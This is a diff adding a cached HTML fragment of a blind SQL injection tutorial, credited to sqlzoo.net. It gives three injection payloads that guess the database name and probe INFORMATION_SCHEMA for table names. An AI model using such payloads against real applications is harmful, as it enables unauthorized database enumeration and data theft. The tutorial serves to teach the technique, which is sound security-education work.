@@ -1,0 +1,28 @@
+I"�<p>In the previous examples we cheated a little. You knew that the table
+containing user names and passwords was called users and you knew that it had
+two columns, name and password. In some cases you do not know the name of the
+table or the column names, but you can use the same techniques to find these
+out.</p>
+
+<p>You need to find out the name of the database that you are using. The function
+DATABASE() will give you that value (but you have to guess at it as before).
+When you know the name of the database being used you can take guesses at the
+names of the tables.</p>
+
+<p><strong>Does the current database contain the letter j?</strong></p>
+
+<p>’ OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE ‘%j%’) AND ‘’=’</p>
+
+<p><strong>Is there a table called one in database test?</strong></p>
+
+<p>’ OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=’test’
+AND TABLE_NAME=’one’) AND ‘’=’</p>
+
+<p><strong>Is there more than one table in the database(s) containing a j?</strong></p>
+
+<p>’ OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE
+‘%j%’)&gt;1 AND ‘’=’</p>
+
+<p>참고 : http://sqlzoo.net/hack/24table.htm</p>
+
+:ET
